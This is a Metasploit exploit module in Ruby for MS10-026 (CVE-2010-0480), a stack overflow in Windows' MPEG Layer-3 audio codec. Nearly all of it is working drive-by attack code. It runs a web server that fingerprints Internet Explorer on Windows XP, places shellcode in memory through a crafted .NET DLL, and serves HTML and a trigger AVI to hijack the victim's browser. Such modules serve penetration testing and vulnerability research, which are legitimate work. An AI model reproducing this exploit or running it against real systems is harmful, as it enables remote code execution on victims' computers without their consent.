# $Id: ms10_026_avi_nsamplespersec.rb 13555 2011-08-13 02:15:05Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;MS10-026 Microsoft MPEG Layer-3 Audio Stack Based Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overlow in l3codecx.ax while processing a
                AVI files with MPEG Layer-3 audio contents. The overflow only allows to overwrite
                with 0&#039;s so the three least significant bytes of EIP saved on stack are
                overwritten and shellcode is mapped using the .NET DLL memory technique pioneered
                by Alexander Sotirov and Mark Dowd.
 
                Please note on IE 8 targets, your malicious URL must be a trusted site in order
                to load the .Net control.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Yamata Li&#039;, # Vulnerability Discovery
                    &#039;Shahin Ramezany <shahin[at]abysssec.com&#039;, # Vulnerability Analysis and Exploit
                    &#039;juan vazquez&#039;, # Metasploit module
                    &#039;Jordi Sanchez <jsanchez[at]0x01000000.org>&#039;, # Metasploit module - Help
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13555 $&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2010-0480&#039;],
                    [&#039;OSVDB&#039;, &#039;63749&#039;],
                    [&#039;BID&#039;, &#039;39303&#039;],
                    [&#039;MSB&#039;, &#039;MS10-026&#039;],
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/moaub-5-microsoft-mpeg-layer-3-audio-stack-based-overflow/&#039;],
                    [&#039;URL&#039;, &#039;http://www.phreedom.org/research/bypassing-browser-memory-protections/&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 4000
                },
            &#039;DefaultOptions&#039; =>
                {
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Targets&#039;        =>
                [
                    # Target 0: Automatic
                    # Tested with:
                    # Windows XP SP3 English IE 6
                    # Windows XP SP3 English IE 7
                    # Windows XP SP3 English IE 8: The exploiting site must be a trusted
                    # site to load the .NET control
                    # .NET CLR required
                    [
                        &#039;Windows XP SP3 Automatic&#039;,
                        {
                            &#039;Platform&#039; => &#039;win&#039;,
                            &#039;Ret&#039; => 0x72000000
                        },
                    ]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Apr 13 2010&#039;))
    end
 
    def exploit
        # Embed our payload in a .Net binary
        ibase = target.ret - 0x10000
        shellcode = rand_text_alpha(target.ret - ibase - 0x2285)
        shellcode << payload.encoded
 
        #Use our own custom .Net binary, because we require a much bigger file
        #to land our payload at the right place
        opts = {
            :template    => &#039;template_dotnetmem.dll&#039;,
            :text_offset => 0x1285,
            :text_max    => 0x20000,
            :pack        => &#039;a131072&#039;,
            :uuid_offset => 135816
        }
 
        @dotnet_payload = Msf::Util::EXE.to_dotnetmem(ibase, shellcode, opts)
 
        # Load our AVI file
        path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2010-0480.avi")
        f = File.open(path, "rb")
        @trigger = f.read(f.stat.size)
        f.close
 
        super
    end
 
    def on_request_uri(cli, request)
 
        agent = request[&#039;User-Agent&#039;]
        case request[&#039;User-Agent&#039;]
            when /MSIE.*Windows NT 5\.1.*\.NET CLR .*/
            when /Windows-Media-Player/
                # AVI is requested by WMP
            else
                send_not_found(cli)
                print_error("#{cli.peerhost}:#{cli.peerport} - target not supported: #{agent}")
                return
        end
 
        if (request.uri =~ /\.html/i)
            avi_name = rand_text_alpha(4)
            avi_trigger = ""
 
            if ("/" == get_resource[-1,1])
                avi_trigger = get_resource[0, get_resource.length - 1]
            else
                avi_trigger = get_resource
            end
 
            avi_trigger << "/#{avi_name}.avi"
 
            html = %Q|<html>
            <body>
            <OBJECT ID="MediaPlayer"
            CLASSID="CLSID:22d6f312-b0f6-11d0-94ab-0080c74c7e95"
            CODEBASE="http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#
            Version=5,1,52,701" STANDBY="Loading Microsoft Windows Media Player components..."
            TYPE="application/x-oleobject" width="280" height="46">
                <param name="fileName" value="#{avi_trigger}">
                <param name="animationatStart" value="true">
                <param name="transparentatStart" value="true">
                <param name="autoStart" value="true">
                <param name="showControls" value="true">
                <param name="Volume" value="-300">
            <embed type="application/x-mplayer2"
                pluginspage="http://www.microsoft.com/Windows/MediaPlayer/"
                src="#{avi_trigger}"
                name="MediaPlayer"
                width=280
                height=46
                autostart=1
                showcontrols=1
                volume=-300>
            </embed>
            </OBJECT>
            </body>
            </html>
            |
 
            html = html.gsub(/^\t\t\t/, &#039;&#039;)
 
            print_status("Sending trigger loader to #{cli.peerhost}:#{cli.peerport}...")
            send_response_html(cli, html)
 
        elsif (request.uri =~ /\.avi$/i)
 
            print_status "Sending AVI trigger to #{cli.peerhost}:#{cli.peerport} ..."
            send_response(cli, @trigger, { &#039;Content-Type&#039; => &#039;application/octet-stream&#039; })
            return
 
        elsif (request.uri =~ /\.dll$/i)
 
            print_status "Sending DLL file to #{cli.peerhost}:#{cli.peerport} ..."
            send_response(
                cli,
                @dotnet_payload,
                {
                    &#039;Content-Type&#039; => &#039;application/x-msdownload&#039;,
                    &#039;Connection&#039;   => &#039;close&#039;,
                    &#039;Pragma&#039;       => &#039;no-cache&#039;
                }
            )
            return
 
        end
 
        html_name = rand_text_alpha(4)
        dll_uri = ""
        html_trigger = ""
 
        if ("/" == get_resource[-1,1])
            dll_uri = get_resource[0, get_resource.length - 1]
            html_trigger = get_resource[0, get_resource.length - 1]
        else
            dll_uri = get_resource
            html_trigger = get_resource
        end
 
        dll_uri << "/generic-" + Time.now.to_i.to_s + ".dll"
        js_net_dll = "<object classid=\"#{dll_uri}\"#GenericControl\"><object>"
        html_trigger << "/#{html_name}.html"
 
        html  = %Q|<html>
        <head>
        <script language="javascript">
            function forward() {
                window.location = window.location + &#039;#{html_trigger}&#039;;
            }
 
            function start() {
                setTimeout("forward()", 2000);
            }
        </script>
        </head>
        <body onload="start()">
        <object classid="#{dll_uri}#GenericControl">
        <object>
        </body>
        </html>
        |
 
        html = html.gsub(/^\t\t/, &#039;&#039;)
 
        print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
        send_response_html(cli, html)
    end
 
end



